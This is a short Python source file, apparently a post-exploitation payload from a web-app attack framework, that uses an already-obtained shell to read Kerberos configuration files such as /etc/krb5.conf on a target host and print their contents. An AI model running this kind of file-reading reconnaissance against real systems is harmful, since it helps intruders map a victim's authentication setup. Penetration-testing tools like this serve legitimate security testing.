import re
from plugins.attack.payloads.base_payload import base_payload

class kerberos_config_files(base_payload):
    '''
    This payload shows Kerberos configuration files
    '''
    def run_read(self):
        result = []
        files = []

        files.append('/etc/krb5.conf')
        files.append('/etc/krb5/krb5.conf')
        #files.append('c:\winnt\krb5.ini')

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        if result == [ ]:
            result.append('Kerberos not found.')
        return result
        
